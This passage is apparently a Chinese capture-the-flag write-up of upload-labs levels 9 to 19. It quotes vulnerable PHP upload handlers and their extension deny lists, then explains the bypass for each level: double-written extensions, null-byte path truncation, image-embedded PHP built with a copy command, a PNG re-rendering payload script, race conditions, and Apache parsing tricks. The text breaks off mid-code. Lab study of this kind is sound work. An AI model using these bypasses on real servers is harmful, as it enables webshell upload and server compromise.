class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>该题好像各个方面都防御的很好,但是仔细一看会发现,该题先除去了文件后面的点,再除去空格,这里的操作都是一次,所以可以双写绕过<br><img src="https://img-blog.csdnimg.cn/20210614232155877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210614232216441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-10</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>); //如果file_name的值在deny_ext中就替换为空<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        <br>        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>与前几题不同,这里没有过滤”.”,”::$DATA”等,应该上传对象不是windows,而这里的str_ireplace用来把黑名单里的字符替换成空格,且不区分大小,不可通过大小来替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">str_ireplace(find,replace,string,count)<br> 替换字符串中的一些字符（不区分大小写）<br></code></pre></td></tr></table></figure><p>依旧可以双写绕过<br><img src="https://img-blog.csdnimg.cn/2021061423311315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210614233131851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-11</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+1);<br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(10, 99).<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里使用了白名单,只允许jpg,png,gif后缀上传，但是这里通过$img_path &#x3D; $_GET[‘save_path’].”&#x2F;“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;拼接成文件储存路径,可通过00截断进行绕过</p><p>原理:修改后文件储存路径变成.&#x2F;upload&#x2F;4.php%00&#x2F;随机数&#x2F;.jpg</p><p> 而php相关文件函数会认为%00是结束的标志,就成了..&#x2F;upload&#x2F;4.php</p><p>截断条件：<br>1、php版本小于5.3.4<br>2、php.ini的magic_quotes_gpc为OFF状态<br><img src="https://img-blog.csdnimg.cn/20210614234802699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此处自己没有那么低的php所以偷图来凑</p><p><strong>Pass-12</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+1);<br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(10, 99).<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传失败&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>与Pass-11不同,这里用到了POST传值,这里用到的也是00截断</p><p>但是%00指的是一个空字符,代表结束,GET传值因为url编码会把它解析成空字符,而POST传值没有这个特点,所以我们得手动通过通过请求头的hex编码所对应的地方添加00（十六进制）来达到目的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">因此先在upload/后添加任意字符（一般为空格，因为空格对应的hex码为20比较好记）<br>通过hex编码我们可以找到upload/的位置，把它后面的20改为00即可。<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210615000340716.png" alt="在这里插入图片描述"><br>还是由于这里没有低版的php截不了图</p><p><strong>Pass-13</strong><br><img src="https://img-blog.csdnimg.cn/20210615211658194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>制作图片马<br>在cmd中执行copy 1.jpg &#x2F;b + phpinfo.php &#x2F;b phpinfo.jpg</p><p><img src="https://img-blog.csdnimg.cn/20210615212613356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以利用文件包含<br><img src="https://img-blog.csdnimg.cn/20210615212851737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功解析了</p><p><strong>Pass-14</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> isImage(<span class="hljs-variable">$filename</span>)&#123;<br>    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$info</span> = getimagesize(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-variable">$ext</span> = image_type_to_extension(<span class="hljs-variable">$info</span>[2]);<br>        <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=0)&#123;<br>            <span class="hljs-built_in">return</span> <span class="hljs-variable">$ext</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其实就是多了对文件类型的判断，getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>绕过方式和Pass-13一样</p><p><strong>Pass-15</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> isImage(<span class="hljs-variable">$filename</span>)&#123;<br>    //需要开启php_exif模块<br>    <span class="hljs-variable">$image_type</span> = exif_imagetype(<span class="hljs-variable">$filename</span>);<br>    switch (<span class="hljs-variable">$image_type</span>) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-built_in">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-built_in">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-built_in">break</span>;    <br>        default:<br>            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-built_in">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210616112729470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>exif_imagetype()函数用于判断一个图像的类型<br>所以绕过和Pass-13一样<br><strong>Pass-16</strong><br>是一个文件的二次渲染<br>先参考：<a href="https://xz.aliyun.com/t/2657#toc-3">https://xz.aliyun.com/t/2657#toc-3</a><br>直接利用现成的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$p</span> = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,<br>           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,<br>           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,<br>           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,<br>           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,<br>           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,<br>           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,<br>           0x66, 0x44, 0x50, 0x33);<br><br><br><br><span class="hljs-variable">$img</span> = imagecreatetruecolor(32, 32);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = 0; <span class="hljs-variable">$y</span> &lt; sizeof(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += 3) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+1];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+2];<br>   <span class="hljs-variable">$color</span> = imagecolorallocate(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   imagesetpixel(<span class="hljs-variable">$img</span>, round(<span class="hljs-variable">$y</span> / 3), 0, <span class="hljs-variable">$color</span>);<br>&#125;<br><br>imagepng(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>运行后用16进制形式打开文件<br><img src="https://img-blog.csdnimg.cn/20210615222029309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将这个文件上传抓包拦截，修改里面的内容，当然也可以直接打开修改在上传<br><img src="https://img-blog.csdnimg.cn/20210615223046312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功解析了<br><img src="https://img-blog.csdnimg.cn/20210615223104852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>Pass-17</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$file_name</span>,strrpos(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+1);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. rand(10, 99).<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             rename(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-built_in">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析源码move_uploaded_file($temp_file, $upload_file)会把上传的文件先移到一个临时文件，然后判断文件是否合法了在移动回去。<br>所以需要利用条件竞争删除文件时间差绕过。使用burpsuite<br><img src="https://img-blog.csdnimg.cn/20210615230946723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210615231018831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Start attack<br>成功访问到<br><img src="https://img-blog.csdnimg.cn/20210615231108313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-18</strong><br>查看源码<br><img src="https://img-blog.csdnimg.cn/20210616111842724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210616112237535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>前面有个upload,那我们利用条件竞争绕过访问改名前的文件时得在文件前面也要加个upload<br><img src="https://img-blog.csdnimg.cn/20210616123638277.png" alt="在这里插入图片描述"></p><p>7z后缀并不被Apache服务器所识别，却在上传文件名后缀的白名单中，可以利用Apache的解析漏洞将上传的7z后缀文件当做php文件解析<br><img src="https://img-blog.csdnimg.cn/20210616124250310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功解析<br><strong>Pass-19</strong><br><img src="https://img-blog.csdnimg.cn/20210616124545318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span 